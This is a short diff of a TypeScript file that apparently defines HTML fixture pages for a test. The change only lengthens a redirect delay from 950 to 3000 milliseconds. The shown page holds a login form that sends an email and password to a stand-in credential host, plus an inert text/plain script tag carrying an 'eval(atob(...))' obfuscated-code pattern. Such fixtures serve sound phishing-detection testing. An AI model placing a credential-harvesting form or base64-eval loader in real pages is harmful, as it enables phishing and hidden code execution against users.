@@ -63,7 +63,7 @@ const pages = new Map<string, string>([
     <form action="https://credential.example.test/login"><input name="email"><input name="password" type="password"></form>
   </main>
   <script type="text/plain">eval(atob("${encoded}"));</script>
-  <script>setTimeout(() => { location.href = "/final" }, 950)</script>
+  <script>setTimeout(() => { location.href = "/final" }, 3000)</script>
 </body></html>`],
     ['/final', `<!doctype html>
 <html><head><title>Final redirect page</title></head>
